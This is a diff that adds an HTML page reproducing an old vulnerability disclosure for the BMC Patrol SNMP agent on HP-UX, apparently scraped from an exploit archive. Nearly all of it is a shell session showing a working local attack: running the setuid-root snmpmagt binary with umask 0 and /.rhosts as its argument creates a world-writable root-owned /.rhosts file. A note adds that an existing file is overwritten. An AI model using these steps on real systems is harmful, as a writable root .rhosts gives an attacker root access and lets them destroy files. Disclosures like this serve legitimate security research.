@@ -1,0 +1,7 @@
+#SpeeDr00t@Black Falcon<br>#bid525<p><b><span style="font-size: 18pt;"></span></b></p><br><br><br><br><br><br>#<br>#<br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title">BMC Patrol SNMP Agent File Creation/Permission Vulnerability</span><br/><br/>
+	maheaa@jedi:/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin&amp;gt; ls -al snmpmagt<br/>-rwsr-xr-x   1 root       users       185461 Mar  6  1998 snmpmagt*<br/><br/>maheaa@jedi:/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin&amp;gt; ls -al /.rhosts<br/>/.rhosts not found<br/><br/>maheaa@jedi:/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin&amp;gt; umask 0<br/><br/>maheaa@jedi:/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin&amp;gt; snmpmagt yoyoyo /.rhosts<br/><br/>yoyoyo: No such file or directory<br/>snmp bind failure: Address already in use<br/>/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin/snmpmagt: error processing configuration<br/><br/>maheaa@jedi:/opt/patrol/PATROL3.2/HPUX-PA1.1-V10/bin&amp;gt; ls -al /.rhosts<br/>-rw-rw-rw-   1 root       users          770 Jul 13 14:42 .rhosts<br/><br/>note: If the file exists, it keeps the same perms and overwrites it<br/>with "i^A" then the result of gethostname() and some whitespace. this<br/>problem is not platform dependent and was tested based on out of box <br/>install on an HP.
+	
+		<ul>
+</ul>
+</div>
